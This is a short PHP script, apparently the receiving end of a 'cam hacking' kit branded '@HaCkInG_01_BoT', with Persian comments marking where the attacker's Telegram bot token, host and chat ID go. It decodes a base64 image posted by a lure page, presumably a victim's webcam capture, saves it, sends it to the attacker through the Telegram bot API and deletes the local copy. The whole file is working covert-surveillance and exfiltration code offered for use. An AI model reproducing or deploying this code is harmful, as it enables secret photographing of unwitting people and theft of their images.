<?php
$cap="🆔 @HaCkInG_01_BoT  Version source: [ V 1 ]";
$token=" ";//توکن ربات
$host=" ";//آدرس پوشه فایل
$admin=" ";//آیدی برای ارسال محتوا
$date = date('dMYHis');
$imageData=$_POST['cat'];
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

file_get_contents("https://api.telegram.org/bot$token/SendPhoto?chat_id=$admin&photo=$host/cam".$date.".png&caption= $cap ");
unlink("cam".$date.".png");

?>

